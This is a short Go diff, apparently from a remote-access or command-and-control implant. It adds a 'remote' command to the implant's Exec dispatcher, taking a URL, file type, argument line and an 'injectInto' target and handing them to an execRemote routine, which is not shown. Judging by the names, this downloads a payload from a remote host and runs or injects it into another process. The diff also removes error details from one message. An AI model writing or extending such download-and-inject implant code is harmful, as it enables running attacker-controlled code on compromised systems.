@@ -157,7 +157,7 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 		executable, args, err := model.MakePacketArgumentFrom(packetArgument)
 		executable = ResolveWinVar(executable)
 		if err != nil {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: %s", err.Error())
+			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given")
 		}
 
 		spawnType, ok := packetArgument["spawnType"]
@@ -170,6 +170,25 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 		}
 
 		return execDirect(executable, args, spawnType, spawnData)
+
+	case "remote":
+		url, ok := packetArgument["url"]
+		if !ok {
+			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no url")
+		}
+		fileType, ok := packetArgument["type"]
+		if !ok {
+			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no type")
+		}
+		argline, ok := packetArgument["argline"]
+		if !ok {
+			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no argline")
+		}
+		injectInto, ok := packetArgument["injectInto"]
+		if !ok {
+			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no injectInto")
+		}
+		return execRemote(url, fileType, argline, injectInto)
 
 	default:
 		return stdOut, stdErr, pid, exitCode, fmt.Errorf("shelltype %s unkown a", shellType)
